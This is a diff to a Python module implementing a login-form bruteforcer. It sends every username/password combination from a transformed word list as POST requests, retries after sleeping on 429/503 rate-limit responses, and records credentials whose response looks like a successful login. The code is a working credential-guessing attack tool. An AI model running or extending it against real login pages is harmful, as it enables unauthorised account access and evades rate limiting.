@@ -1,18 +1,21 @@
-from funcs import transform
-from http_requests.Socket import Socket
-from http_requests.HttpRequest import HttpRequest
-from collections import namedtuple
-from utils.constants import HTTP_CONTENTTYPE_FORMENCODED
-from utils.constants import SUCCESS_KEYWORDS
-
-from utils.link_utils import verify_success_resp
-
+# python imports
 import time
 
-Credential = namedtuple('Credential', ["user", "password"])
+# funcs imports
+from funcs import transform
+
+# http_requests imports
+from http_requests.Socket import Socket
+from http_requests.HttpRequest import HttpRequest
+
+# utils imports
+from utils.constants import HTTP_CONTENTTYPE_FORMENCODED
+from utils.constants import SUCCESS_KEYWORDS
+from utils.namedtuples import Credential
+from utils.link_utils import verify_success_resp, tokenize_html
 
 def bruteforce(request, url, host, port, agent, 
-                user_key, pass_key, words):
+                user_key, pass_key, action_val, words):
     """ Bruteforces every combination of username and password for a specific form.
 
     Parameters
@@ -43,6 +46,7 @@ def bruteforce(request, url, host, port, agent,
     """
     # successful credentials
     success = []
+    success_users = set()
 
     # Add all transformations for each word
     all_words = set(words)
@@ -59,13 +63,14 @@ def bruteforce(request, url, host, port, agent,
     sleep_time = 30
     for user in all_words:
         for _pass in all_words:
-            data = {user_key: user, pass_key: _pass}
+            data = {user_key: user, pass_key: _pass, 'action': action_val}
             body = request.generate_post_body(content_type,data)
             content_length = len(body)
             too_many_req = True
             while too_many_req:
                 request.connect()
                 successful = request.send_post_request(url, host, agent, content_type, content_length, body)
+                print(f'User: {user}, Pass: {_pass} -- TEST.')
 
                 if successful:
                     response = request.receive()
@@ -74,23 +79,23 @@ def bruteforce(request, url, host, port, agent,
                     #     print('Should be successful')
                     
                     # See if the response contained any words that indicate the login was successful.
-                    if verify_success_resp(response):
-                        success.append(Credential(user,_pass))
+                    if verify_success_resp(tokenize_html(response, True)):
+                        print(f'    SUCCESS.')
+                        if user.lower() not in success_users:
+                            success.append(Credential(user.lower(),_pass))
+                            success_users.add(user.lower())
+                        too_many_req = False
                         continue
 
                     # Check the status code
                     _tuple = HttpRequest.get_status_code(response)
                     if _tuple is not None:
                         status_code, __ = _tuple
+                        print(f'     {status_code}')
                         if status_code == "429" or status_code == "503":
                             time.sleep(sleep_time)
                         else:
                             too_many_req = False
-                        # If we are redirected, assume login was successful.
-                        if status_code[:1] == "3":
-                            success.append(Credential(user,_pass))
-                            print(f'User: {user}, Pass: {_pass} -- SUCCESS.')
-                            continue
                 else:
                     too_many_req = False
                 request.close()
